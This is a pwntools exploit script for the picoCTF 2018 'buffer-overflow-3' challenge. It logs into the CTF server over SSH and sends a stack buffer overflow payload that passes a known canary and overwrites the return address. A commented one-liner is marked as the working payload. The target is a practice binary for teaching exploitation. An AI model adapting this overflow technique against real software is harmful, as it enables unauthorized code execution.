from pwn import *
import json

REMOTE=True
hostname ="2018shell.picoctf.com"
if REMOTE:
    with open("/.2018creds.json") as f:
        creds = json.load(f)
        print(creds["user"],creds["pass"])
    s = ssh(host=hostname,user=creds["user"],password=creds["pass"])
    s.set_working_directory(b"/problems/buffer-overflow-3_4_931796dc4e43db0865e15fa60eb55b9e")
    sh = s.process('sh')
    alpha = "qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890!@#$%^&*-_=+,./><"
    #for i in range(38,127):
    for letter in alpha:
        payload = "python -c \"" + "print'36\\n' + 'A'*32 + '<zO%"+"'\" | ./vuln"
        payload = b"python -c \"" + b"print'56\\n' + 'A'*32 + '<zO%" + b"b"*16 + p32(0x080486eb)+b"'\" | ./vuln"
        print( payload)
        sh.sendline(payload)
        sh.recvline()
        sh.recvline()
        print(sh.recvline())
    '''
        payload = b"python -c \"" + b"print'56\\n' + 'A'*32 + '<zO%" + b"b"*16 + p32(0x080486eb)+b"'\" | ./vuln"

this one actually works
python -c 'print "56\n" + "A"*32+"<zO%" + "B"*16 + "\xeb\x86\x04\x08"' | ./vuln
    36+12+4=52

    080486eb
    sh.sendline(payload)
    print(sh.recvline())
    print(sh.recvline())
    '''
